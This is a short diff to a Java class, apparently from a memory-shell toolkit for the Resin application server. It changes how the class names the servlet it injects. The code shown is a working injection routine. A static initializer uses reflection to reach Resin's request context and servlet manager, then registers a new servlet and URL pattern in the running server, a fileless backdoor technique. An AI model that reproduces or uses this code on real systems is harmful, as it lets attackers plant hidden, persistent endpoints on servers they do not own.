@@ -11,13 +11,11 @@ import java.util.HashMap;
 public class RSMSFromThreadS implements Servlet {
     public static String pattern;
 
+    public static String NAME;
+
     static {
         try {
-            String servletName = String.valueOf(System.nanoTime());
-
-            Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch" +
-                    ".ServletInvocation");
-
+            Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
             Method                       getContextRequest = si.getMethod("getContextRequest");
             javax.servlet.ServletRequest contextRequest    = (javax.servlet.ServletRequest) getContextRequest.invoke(null);
 
@@ -44,9 +42,9 @@ public class RSMSFromThreadS implements Servlet {
             f3.setAccessible(true);
             HashMap map = (HashMap) f3.get(manager);
 
-            map.put(servletName, new ServletConfigImpl());
+            map.put(NAME, new ServletConfigImpl());
 
-            smapping.setServletName(servletName);
+            smapping.setServletName(NAME);
             smapping.addURLPattern(pattern);
 
             web1.addServletMapping(smapping);
